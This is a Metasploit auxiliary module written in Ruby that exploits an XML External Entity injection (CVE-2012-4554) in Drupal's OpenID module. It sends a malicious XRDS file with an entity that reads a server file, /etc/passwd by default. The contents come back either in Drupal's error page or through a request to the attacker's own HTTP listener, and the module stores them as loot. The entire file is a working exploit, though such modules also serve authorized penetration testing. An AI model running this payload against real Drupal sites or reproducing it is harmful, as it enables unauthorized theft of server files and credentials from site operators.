##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Drupal OpenID External Entity Injection',
      'Description'    => %q{
        This module abuses a XML External Entity Injection on the OpenID module
        from Drupal. The vulnerability exists on the parsing of a malformed XRDS
        file coming from a malicious OpenID endpoint. This module has been tested
        successfully on Drupal 7.15 with the OpenID module enabled.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Reginaldo Silva', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2012-4554' ],
          [ 'OSVDB', '86429' ],
          [ 'BID', '56103' ],
          [ 'URL', 'https://drupal.org/node/1815912' ],
          [ 'URL', 'http://drupalcode.org/project/drupal.git/commit/b912710' ],
          [ 'URL', 'http://www.ubercomp.com/posts/2014-01-16_facebook_remote_code_execution' ]
        ],
      'DisclosureDate' => 'Oct 17 2012'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base Drupal directory path", '/drupal']),
        OptString.new('FILEPATH', [true, "The filepath to read on the server", "/etc/passwd"])
      ], self.class)

  end

  def xrds_file
    xrds = <<-EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT URI ANY>
<!ENTITY xxe SYSTEM "file://#{datastore['FILEPATH']}">
]>
<xrds:XRDS xmlns:xrds="xri://$xrds" xmlns="xri://$xrd*($v*2.0)" xmlns:openid="http://openid.net/xmlns/1.0">
<XRD>
  <Status cid="verified"/>
  <ProviderID>xri://@</ProviderID>
  <CanonicalID>http://example.com/user</CanonicalID>
  <Service>
    <Type>http://specs.openid.net/auth/2.0/signon</Type>
    <Type>http://openid.net/srv/ax/1.0</Type>
    <URI>#{get_uri}/#{@prefix}/&xxe;/#{@suffix}</URI>
    <LocalID>http://example.com/xrds</LocalID>
  </Service>
</XRD>
</xrds:XRDS>
EOF
    return xrds
  end

  def check
    signature = Rex::Text.rand_text_alpha(5 + rand(5))
    res = send_openid_auth(signature)

    unless res
      return Exploit::CheckCode::Unknown
    end

    if drupal_with_openid?(res, signature)
      return Exploit::CheckCode::Detected
    end

    if generated_with_drupal?(res)
      return Exploit::CheckCode::Safe
    end

    return Exploit::CheckCode::Unknown
  end

  def run
    @prefix = Rex::Text.rand_text_alpha(4 + rand(4))
    @suffix = Rex::Text.rand_text_alpha(4 + rand(4))
    exploit
  end

  def primer
    res = send_openid_auth(get_uri)

    if res.nil?
      # nothing to do here...
      service.stop
      return
    end

    unless res.code == 500
      print_warning("#{peer} - Unexpected answer, trying to parse anyway...")
    end

    error_loot = parse_loot(res.body)

    # Check if file was retrieved on the drupal answer
    # Better results, because there isn't URL encoding,
    # plus probably allows to retrieve longer files.
    print_status("#{peer} - Searching loot on the Drupal answer...")
    unless loot?(error_loot)
      # Check if file was leaked to the fake OpenID endpoint
      # Contents are probably URL encoded, plus probably long
      # files aren't full, but something is something :-)
      print_status("#{peer} - Searching loot on HTTP query...")
      loot?(@http_loot)
    end

    # stop the service so the auxiliary module ends
    service.stop
  end


  def on_request_uri(cli, request)
    if request.uri =~ /#{@prefix}/
      vprint_status("Signature found, parsing file...")
      @http_loot = parse_loot(request.uri)
      return
    end

    print_status("Sending XRDS...")
    send_response_html(cli, xrds_file, { 'Content-Type' => 'application/xrds+xml' })
  end

  def send_openid_auth(identifier)
    res = send_request_cgi({
      'uri'    => normalize_uri(target_uri.to_s, "/"),
      'method' => 'POST',
      'vars_get' => {
        "q" => "node",
        "destination" => "node"
      },
      'vars_post' => {
        "openid_identifier" => identifier,
        "name" => "",
        "pass" => "",
        "form_id" => "user_login_block",
        "op" => "Log in"
      }
    })

    return res
  end

  def store(data)
    path = store_loot("drupal.file", "text/plain", rhost, data, datastore['FILEPATH'])
    print_good("#{peer} - File saved to path: #{path}")
  end

  def parse_loot(data)
    return nil if data.blank?

    # Full file found
    if data =~ /#{@prefix}\/(.*)\/#{@suffix}/m
      return $1
    end

    # Partial file found
    if data =~ /#{@prefix}\/(.*)/m
      return $1
    end

    return nil
  end

  def loot?(data)
    return false if data.blank?
    store(data)
    return true
  end

  def drupal_with_openid?(http_response, signature)
    return false if http_response.blank?
    return false unless http_response.code == 200
    return false unless http_response.body =~ /openid_identifier.*#{signature}/
    return true
  end

  def generated_with_drupal?(http_response)
    return false if http_response.blank?
    return true if http_response.headers['X-Generator'] and http_response.headers['X-Generator'] =~ /Drupal/
    return true if http_response.body and http_response.body.to_s =~ /meta.*Generator.*Drupal/
    return false
  end


end

